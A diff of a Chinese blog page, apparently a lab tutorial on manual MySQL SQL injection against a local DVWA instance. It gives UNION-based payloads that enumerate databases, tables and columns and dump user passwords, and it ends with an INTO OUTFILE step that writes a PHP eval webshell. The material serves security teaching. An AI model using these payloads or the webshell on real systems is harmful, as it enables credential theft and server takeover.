@@ -266,18 +266,15 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>##什么是SQL注入</p>
-<blockquote>
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><blockquote>
 <p>A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p>
 </blockquote>
 <p>引用<a href="https://www.owasp.org/index.php/SQL_Injection" target="_blank" rel="noopener">OWASP</a>上的定义，sql注入简单来说就是攻击者从客户端输入的恶意sql查询语句被服务器执行，从而攻击者可以读取/修改数据库中敏感信息、执行数据库管理员操作、甚至执行系统命令。</p>
-<p>##什么是Mysql</p>
-<blockquote>
+<h3 id="什么是Mysql"><a href="#什么是Mysql" class="headerlink" title="什么是Mysql"></a>什么是Mysql</h3><blockquote>
 <p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。</p>
 </blockquote>
 <p>Mysql简单来说就是一个关系型的数据库管理系统，使用SQL语言来来存储数据，以及管理数据。</p>
-<p>#MySQL手工注入</p>
-<p>SQL注入从注入的手法或者工具上分类的话可以分为：</p>
+<h2 id="MySQL手工注入"><a href="#MySQL手工注入" class="headerlink" title="MySQL手工注入"></a>MySQL手工注入</h2><p>SQL注入从注入的手法或者工具上分类的话可以分为：</p>
 <ul>
 <li>手工注入(手工来构造调试输入payload)</li>
 <li>工具注入(使用工具，如sqlmap)</li>
@@ -288,70 +285,61 @@
 <li>盲注入</li>
 </ul>
 <p>这两种分类的主要区别在于能否从页面上直接获取数据库信息。</p>
-<p>##手工注入流程</p>
-<p>###判断注入点</p>
-<p>注入的第一步是得判断该处是否是一个注入点。或者说判断此处是否有SQL注入漏洞。最简单的判断方法就是在正常的参数后加<strong>单引号</strong> <code>&#39;</code>。</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>注入的第一步是得判断该处是否是一个注入点。或者说判断此处是否有SQL注入漏洞。最简单的判断方法就是在正常的参数后加<strong>单引号</strong> <code>&#39;</code>。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.111/dvwa/vulnerabilities/sqli/?Submit=Submit&amp;id=1&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="media/myssql-sqlinjection-1.jpeg" alt="myssql-sqlinjection-1"></p>
+<img src="/2017/11/25/MySQL-手工注入/myssql-sqlinjection-1.jpeg" title="This is an image">
 <p>如果页面显示了SQL的错误信息，进一步测试:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/myssql-sqlinjection-2.jpg" alt=""></p>
+
 <p>页面显示正常。再测试：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118858859099.jpg" alt=""></p>
+
 <p>至此基本可以确定此处是一个SQL注入点，也就是说存在SQL注入漏洞。</p>
 <p><em>判断注入点的依据其实就是查看，输入的恶意语句是否按照预期被执行了。输入中插入<code>&#39;</code>会使SQL语句多出一个单引号无法闭合，从而导致数据库报错。如果页面有报错显示，则说明插入的<code>&#39;</code>按照预期被数据库当做单引号执行了。插入的恶意语句能被执行就说明存在SQL注入漏洞。</em></p>
-<p>###判断查询的字段数</p>
-<p>确定了注入点之后，就需要进行下一步的注入操作了。首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。下面尝试输入order by 10 。</p>
+<h3 id="判断查询的字段数"><a href="#判断查询的字段数" class="headerlink" title="判断查询的字段数"></a>判断查询的字段数</h3><p>确定了注入点之后，就需要进行下一步的注入操作了。首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。下面尝试输入order by 10 。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ORDER BY 10 --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118645170049.jpg" alt=""></p>
+
 <p>发现页面报错，那么接下来尝试order by 9， 如果同样报错，则尝试order by 8，依次尝试下去，直到页面显示正常为止。</p>
-<p><img src="media/15118648794734.jpg" alt=""></p>
+
 <p>可以看到order by 2的时候页面显示正常，则说明查询语句只有2个字段。</p>
 <p><em>order by 后面的数字是随机选的，如果页面报错则数字减1再尝试，直到页面显示正常为止，第一个显示正常的数字就是字段数。如果页面显示正常则数字加1再尝试，直到页面报错，最后一个显示正常的数字就是字段数。</em></p>
-<p>###确定回显位</p>
-<p>确定了查询数据的位数，然后开始确定网页的回显位。回显位就是确定查询出来的数据是在网页上面的哪个位置显示出来。使用Union联合查询来确定回显位。</p>
+<h3 id="确定回显位"><a href="#确定回显位" class="headerlink" title="确定回显位"></a>确定回显位</h3><p>确定了查询数据的位数，然后开始确定网页的回显位。回显位就是确定查询出来的数据是在网页上面的哪个位置显示出来。使用Union联合查询来确定回显位。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, 2 --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118811142468.jpg" alt=""></p>
+
 <p>可以看到查询语句中的两个字段都在网页中显示了，分别在First name和 Surname位置上。</p>
-<p>###获取信息函数</p>
-<p>下面就开始获取数据库信息了，常用的几个获取数据的函数分别是：</p>
+<h3 id="获取信息函数"><a href="#获取信息函数" class="headerlink" title="获取信息函数"></a>获取信息函数</h3><p>下面就开始获取数据库信息了，常用的几个获取数据的函数分别是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user()      获取当前用户用户</span><br><span class="line">database()      获取当前数据库</span><br><span class="line">version()       获取数据库版本</span><br><span class="line">@@version_compile_os        获取操作系统版本</span><br></pre></td></tr></table></figure>
 <p>注入下列SQL语句可以查询出数据库当前用户，和当前数据库名。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select user(), database() --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118821444231.jpg" alt=""></p>
+
 <p>注入下列SQL语句，可以查询出数据库版本和当前操作系统版本。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select version(), @@version_compile_os --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118823825124.jpg" alt=""></p>
+
 <p>可以看到注入上面两条语句之后，当前用户、数据库名、数据库版本、操作系统等信息都已经得到了。</p>
-<p>###获取数据库名</p>
-<p>MySQL5新增了一个information_schema结构，这个information_schema数据库中存储着MySQL管理的所有数据库的信息，如数据库名，表名，列名以及权限等等信息。所以可以利用information_schema来快速获取数据库中的表结构信息。常用的information_schema中的表有：</p>
+<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>MySQL5新增了一个information_schema结构，这个information_schema数据库中存储着MySQL管理的所有数据库的信息，如数据库名，表名，列名以及权限等等信息。所以可以利用information_schema来快速获取数据库中的表结构信息。常用的information_schema中的表有：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schemata        (schema_name字段记录所有数据库信息)</span><br><span class="line">tables      (table_name记录表名，table_schema字段记录表所属的数据库信息)</span><br><span class="line">columns     （column_name记录列名，table_name记录列所属的表名，schema_name记录列所属的数据库名）</span><br></pre></td></tr></table></figure>
 <p>所以可以使用schemata表来获取所有数据库名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, SCHEMA_NAME  from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118838158946.jpg" alt=""></p>
+
 <p>这条SQL语句是能够将所有数据库名查询出来，如果页面显示足够多的话是可以直接全部获取的。但是有些情况下，页面可能只会有一条回显记录，那么可以使用<code>limit</code>子句来分批获取所有数据库名。或者直接使用<code>group_concat</code>来一次性获取数据库信息。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, group_concat(SCHEMA_NAME) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118842669296.jpg" alt=""></p>
+
 <p>使用group_concat就能很方便的在一条记录中查询出来所有数据库信息。</p>
-<p>###获取表名</p>
-<p>获取到了数据库信息之后，找到目标数据库，然后开始获取表名信息。可以读取tables表中的table_name来获取。</p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取到了数据库信息之后，找到目标数据库，然后开始获取表名信息。可以读取tables表中的table_name来获取。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, group_concat(TABLE_NAME) from information_schema.tables where schema_name=&apos;dvwa&apos;+--+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118847466065.jpg" alt=""></p>
+
 <p>表名需要使用<code>&#39;</code>单引号包起来，或者使用16进制来表示:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, group_concat(TABLE_NAME) from information_schema.tables where schema_name=0x64767761+--+</span><br></pre></td></tr></table></figure>
-<p>###获取列名</p>
-<p>获取到了表名之后，下面来获取列名。同样通过information_schema的columns表获取。</p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取到了表名之后，下面来获取列名。同样通过information_schema的columns表获取。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, COLUMN_NAME from information_schema.columns where table_name=&apos;users&apos;+--+</span><br></pre></td></tr></table></figure>
-<p><img src="media/15118851705534.jpg" alt=""></p>
+
 <p>表名同样可以使用十六进制表示。</p>
-<p>###获取数据</p>
-<p>下面就开始获取表中的数据了，选择刚才获取的表中的user_id,user,password三列的数据。</p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>下面就开始获取表中的数据了，选择刚才获取的表中的user_id,user,password三列的数据。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select 1, group_concat(user_id,&apos;,user,&apos;,password) from users+--+</span><br></pre></td></tr></table></figure>
-<p>group_concat中间的<code>&#39;</code>是用来分割数据显示的。<br><img src="media/15118854479736.jpg" alt=""></p>
+<p>group_concat中间的<code>&#39;</code>是用来分割数据显示的。</p>
+
 <p>以上，就成功从数据库中获取了管理员账户信息。</p>
-<p>###写shell</p>
-<p>上面获取管理员账号信息之后，就可以登录网页后台，从后台寻找上传点或者其他漏洞来往服务器上写入webshell。在知道服务器的物理地址的情况下，通过SQL语句来写入webshell通常是一种更快捷方便的方式。</p>
+<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>上面获取管理员账号信息之后，就可以登录网页后台，从后台寻找上传点或者其他漏洞来往服务器上写入webshell。在知道服务器的物理地址的情况下，通过SQL语句来写入webshell通常是一种更快捷方便的方式。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select &apos;&lt;?php eval($_POST[shell]); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/shell.php&apos;+--+</span><br></pre></td></tr></table></figure>
 <p>执行成功之后，就能使用菜刀或者其他工具连接网页更目录下的shell.php文件了。</p>
 
